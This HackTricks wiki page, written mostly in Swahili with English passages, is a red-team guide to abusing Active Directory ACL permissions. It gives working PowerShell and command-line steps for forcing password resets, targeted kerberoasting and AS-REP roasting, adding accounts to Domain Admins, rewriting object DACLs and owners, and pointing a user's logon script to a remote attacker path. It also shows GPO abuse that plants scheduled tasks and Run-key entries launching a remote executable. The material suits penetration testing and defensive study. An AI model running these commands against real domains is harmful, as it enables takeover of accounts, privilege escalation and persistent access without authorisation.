# Abusing Active Directory ACLs/ACEs

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**Ukurasa huu ni muhtasari wa mbinu kutoka** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **na** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Kwa maelezo zaidi, angalia makala asilia.**

## **GenericAll Rights on User**

Haki hii inampa mshambuliaji udhibiti kamili juu ya akaunti ya mtumiaji wa lengo. Mara haki za `GenericAll` zinapothibitishwa kwa kutumia amri `Get-ObjectAcl`, mshambuliaji anaweza:

* **Kubadilisha Nywila ya Lengo**: Kwa kutumia `net user <username> <password> /domain`, mshambuliaji anaweza kurekebisha nywila ya mtumiaji.
* **Kerberoasting ya Lengo**: Weka SPN kwenye akaunti ya mtumiaji ili kuifanya iweze kerberoastable, kisha tumia Rubeus na targetedKerberoast.py kutoa na kujaribu kuvunja tiketi ya kutoa tiketi (TGT) hashes.
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
* **Targeted ASREPRoasting**: Zima pre-authentication kwa mtumiaji, na kufanya akaunti yao kuwa hatarini kwa ASREPRoasting.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll Haki kwenye Kundi**

Haki hii inamruhusu mshambuliaji kubadilisha uanachama wa kundi ikiwa wana haki za `GenericAll` kwenye kundi kama `Domain Admins`. Baada ya kubaini jina la kipekee la kundi kwa kutumia `Get-NetGroup`, mshambuliaji anaweza:

* **Kujiongeza kwenye Kundi la Domain Admins**: Hii inaweza kufanywa kupitia amri za moja kwa moja au kutumia moduli kama Active Directory au PowerSploit.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**

Kuwa na haki hizi kwenye kitu cha kompyuta au akaunti ya mtumiaji inaruhusu:

* **Kerberos Resource-based Constrained Delegation**: Inaruhusu kuchukua udhibiti wa kitu cha kompyuta.
* **Shadow Credentials**: Tumia mbinu hii kuiga kompyuta au akaunti ya mtumiaji kwa kutumia haki za kuunda akiba ya sifa.

## **WriteProperty on Group**

Ikiwa mtumiaji ana haki za `WriteProperty` kwenye vitu vyote kwa kundi maalum (mfano, `Domain Admins`), wanaweza:

* **Kujiongeza Kwenye Kundi la Domain Admins**: Inaweza kufanywa kwa kuunganisha amri za `net user` na `Add-NetGroupUser`, mbinu hii inaruhusu kupandishwa vyeo ndani ya eneo.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Hii haki inawawezesha washambuliaji kujiongeza kwenye vikundi maalum, kama `Domain Admins`, kupitia amri zinazoshughulikia uanachama wa kikundi moja kwa moja. Kutumia mfuatano wa amri zifuatazo kunaruhusu kujiongeza:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Privilege hii inayofanana, inawawezesha washambuliaji kujiongeza moja kwa moja kwenye vikundi kwa kubadilisha mali za kikundi ikiwa wana haki ya `WriteProperty` kwenye vikundi hivyo. Uthibitisho na utekelezaji wa haki hii hufanywa kwa:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Kushikilia `ExtendedRight` kwa mtumiaji kwa `User-Force-Change-Password` kunaruhusu mabadiliko ya nywila bila kujua nywila ya sasa. Uthibitishaji wa haki hii na matumizi yake yanaweza kufanywa kupitia PowerShell au zana nyingine za amri, zikitoa njia kadhaa za kurekebisha nywila ya mtumiaji, ikiwa ni pamoja na vikao vya mwingiliano na mistari moja kwa mazingira yasiyo ya mwingiliano. Amri zinatofautiana kutoka kwa mwito rahisi wa PowerShell hadi kutumia `rpcclient` kwenye Linux, ikionyesha ufanisi wa njia za shambulio.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner kwenye Kundi**

Ikiwa mshambuliaji atagundua kuwa ana haki za `WriteOwner` juu ya kundi, anaweza kubadilisha umiliki wa kundi hilo kuwa wake. Hii ina athari kubwa hasa wakati kundi lililo katika swali ni `Domain Admins`, kwani kubadilisha umiliki kunaruhusu udhibiti mpana juu ya sifa za kundi na uanachama. Mchakato unahusisha kubaini kitu sahihi kupitia `Get-ObjectAcl` na kisha kutumia `Set-DomainObjectOwner` kubadilisha mmiliki, ama kwa SID au jina.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Ruhusa hii inamruhusu mshambuliaji kubadilisha mali za mtumiaji. Kwa hakika, kwa ufikiaji wa `GenericWrite`, mshambuliaji anaweza kubadilisha njia ya skripti ya kuingia ya mtumiaji ili kutekeleza skripti mbaya wakati wa kuingia kwa mtumiaji. Hii inafikiwa kwa kutumia amri ya `Set-ADObject` kuboresha mali ya `scriptpath` ya mtumiaji anaye target ili kuelekeza kwenye skripti ya mshambuliaji.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Kwa ruhusa hii, washambuliaji wanaweza kubadilisha uanachama wa kikundi, kama kuongeza wenyewe au watumiaji wengine kwenye vikundi maalum. Mchakato huu unahusisha kuunda kitu cha akiba, kukitumia kuongeza au kuondoa watumiaji kutoka kwa kikundi, na kuthibitisha mabadiliko ya uanachama kwa amri za PowerShell.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Kuwa na kitu cha AD na kuwa na ruhusa za `WriteDACL` juu yake inamuwezesha mshambuliaji kujipatia ruhusa za `GenericAll` juu ya kitu hicho. Hii inafanywa kupitia udanganyifu wa ADSI, ikiruhusu udhibiti kamili juu ya kitu hicho na uwezo wa kubadilisha uanachama wake wa kikundi. Licha ya hili, kuna mipaka wakati wa kujaribu kutumia ruhusa hizi kwa kutumia cmdlets za moduli ya Active Directory `Set-Acl` / `Get-Acl`.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replication on the Domain (DCSync)**

Shambulio la DCSync linatumia ruhusa maalum za kuiga kwenye eneo ili kuiga Kituo cha Kikoa na kusawazisha data, ikiwa ni pamoja na akidi za watumiaji. Mbinu hii yenye nguvu inahitaji ruhusa kama `DS-Replication-Get-Changes`, ikiruhusu washambuliaji kutoa taarifa nyeti kutoka kwenye mazingira ya AD bila ufikiaji wa moja kwa moja kwa Kituo cha Kikoa. [**Jifunze zaidi kuhusu shambulio la DCSync hapa.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Ufikiaji wa delegated wa kusimamia Vitu vya Sera za Kundi (GPOs) unaweza kuleta hatari kubwa za usalama. Kwa mfano, ikiwa mtumiaji kama `offense\spotless` amepewa haki za usimamizi wa GPO, wanaweza kuwa na ruhusa kama **WriteProperty**, **WriteDacl**, na **WriteOwner**. Ruhusa hizi zinaweza kutumika vibaya kwa madhumuni maovu, kama ilivyobainishwa kwa kutumia PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerate GPO Permissions

Ili kubaini GPO zilizo na mipangilio isiyo sahihi, cmdlets za PowerSploit zinaweza kuunganishwa pamoja. Hii inaruhusu kugundua GPO ambazo mtumiaji maalum ana ruhusa za kusimamia: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Kompyuta zenye Sera Iliyotumika**: Inawezekana kutambua ni kompyuta zipi GPO maalum inatumika, kusaidia kuelewa upeo wa athari zinazoweza kutokea. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Sera Zilizotumika kwa Kompyuta Maalum**: Ili kuona ni sera zipi zimewekwa kwa kompyuta fulani, amri kama `Get-DomainGPO` zinaweza kutumika.

**OUs zenye Sera Iliyotumika**: Kutambua vitengo vya shirika (OUs) vilivyoathiriwa na sera fulani kunaweza kufanywa kwa kutumia `Get-DomainOU`.

### Abuse GPO - New-GPOImmediateTask

GPO zilizo na mipangilio isiyo sahihi zinaweza kutumika vibaya kutekeleza msimbo, kwa mfano, kwa kuunda kazi ya ratiba ya haraka. Hii inaweza kufanywa kuongeza mtumiaji kwenye kundi la wasimamizi wa ndani kwenye mashine zilizoathiriwa, ikiongeza sana ruhusa:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Moduli ya GroupPolicy, ikiwa imewekwa, inaruhusu uundaji na kuunganisha GPO mpya, na kuweka mapendeleo kama vile thamani za rejista ili kutekeleza backdoors kwenye kompyuta zilizoathirika. Njia hii inahitaji GPO kusasishwa na mtumiaji kuingia kwenye kompyuta kwa ajili ya utekelezaji:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse inatoa njia ya kutumia GPO zilizopo kwa kuongeza kazi au kubadilisha mipangilio bila haja ya kuunda GPO mpya. Chombo hiki kinahitaji kubadilisha GPO zilizopo au kutumia zana za RSAT kuunda mpya kabla ya kutekeleza mabadiliko:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Force Policy Update

GPO updates typically occur around every 90 minutes. To expedite this process, especially after implementing a change, the `gpupdate /force` command can be used on the target computer to force an immediate policy update. This command ensures that any modifications to GPOs are applied without waiting for the next automatic update cycle.

### Under the Hood

Upon inspection of the Scheduled Tasks for a given GPO, like the `Misconfigured Policy`, the addition of tasks such as `evilTask` can be confirmed. These tasks are created through scripts or command-line tools aiming to modify system behavior or escalate privileges.

The structure of the task, as shown in the XML configuration file generated by `New-GPOImmediateTask`, outlines the specifics of the scheduled task - including the command to be executed and its triggers. This file represents how scheduled tasks are defined and managed within GPOs, providing a method for executing arbitrary commands or scripts as part of policy enforcement.

### Users and Groups

GPOs also allow for the manipulation of user and group memberships on target systems. By editing the Users and Groups policy files directly, attackers can add users to privileged groups, such as the local `administrators` group. This is possible through the delegation of GPO management permissions, which permits the modification of policy files to include new users or change group memberships.

The XML configuration file for Users and Groups outlines how these changes are implemented. By adding entries to this file, specific users can be granted elevated privileges across affected systems. This method offers a direct approach to privilege escalation through GPO manipulation.

Furthermore, additional methods for executing code or maintaining persistence, such as leveraging logon/logoff scripts, modifying registry keys for autoruns, installing software via .msi files, or editing service configurations, can also be considered. These techniques provide various avenues for maintaining access and controlling target systems through the abuse of GPOs.

## References

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
